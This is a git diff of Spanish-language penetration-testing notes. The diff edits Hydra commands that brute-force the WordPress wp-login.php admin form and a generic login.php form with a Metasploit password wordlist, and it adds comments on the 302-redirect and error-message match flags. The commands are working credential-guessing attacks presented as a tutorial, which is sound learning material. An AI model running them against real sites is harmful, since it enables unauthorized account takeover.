@@ -34,11 +34,11 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 
 Esto se usa en el panel del admin de WordPress.
 ```python
-❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
-❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
+❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
+❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
 
-# Si al momento de hacer login en la pagina esta te muestra un mensaje d error, seria de esta manera. Donde colocaremos el mensaje de error en la sentencia. 
-❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
+# Si al momento de hacer login en la pagina esta te muestra un mensaje de error, seria de esta manera. Donde colocaremos el mensaje de error en la sentencia. 
+❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 
 # Haremos un ataque de fuerza bruta a WordPress (Todo lo anterior lo obtenemos de la misma página web en 'form action=/login.php') y colocamos todas la etiquetas 
 
@@ -48,6 +48,8 @@ Esto se usa en el panel del admin de WordPress.
 	# S = Redireccionamiento con el codigo 302
 	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
 ```
+
+![](Pasted%20image%2020240329162024.png)
 
 ## Hydra fuerza bruta WebDAV
 
